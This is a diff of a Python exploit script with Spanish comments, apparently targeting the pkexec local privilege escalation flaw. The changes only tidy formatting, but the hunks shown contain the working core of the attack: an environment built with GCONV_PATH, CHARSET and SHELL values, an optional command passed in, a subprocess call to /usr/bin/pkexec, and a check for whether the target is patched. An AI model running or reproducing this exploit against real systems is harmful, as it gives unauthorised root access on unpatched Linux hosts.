@@ -1,9 +1,9 @@
-#!/usr/bin/env python3 
-#_*_ coding: utf8 _*_
+#!/usr/bin/env python3
 import os
-import sys
-import subprocess
 import shutil
+import subprocess
+import sys
+
 
 def rmrf(path):
     """Elimina recursivamente un directorio y su contenido."""
@@ -37,7 +37,7 @@ def cleanup_exploit_environment():
 def execute_exploit(cmd=None):
     """Ejecuta el exploit."""
     create_exploit_environment()
-    
+
     env = os.environ.copy()
     env.update({
         "GCONV_PATH": ".",
@@ -45,7 +45,7 @@ def execute_exploit(cmd=None):
         "CHARSET": "pkexec",
         "SHELL": "pkexec"
     })
-    
+
     if cmd:
         env["CMD"] = cmd
 
@@ -57,15 +57,15 @@ def execute_exploit(cmd=None):
     try:
         print("[DEBUG] Ejecutando pkexec...")
         result = subprocess.run(
-            ["/usr/bin/pkexec"], 
-            env=env, 
-            capture_output=True, 
+            ["/usr/bin/pkexec"],
+            env=env,
+            capture_output=True,
             text=True
         )
         print("[DEBUG] Salida de pkexec:")
         print(result.stdout)
         print(result.stderr)
-        
+
         # Check if exploit failed
         if "pkexec --version" in result.stderr or "Exploit failed" in result.stderr:
             print("[DEBUG] Exploit failed. Target is most likely patched.")
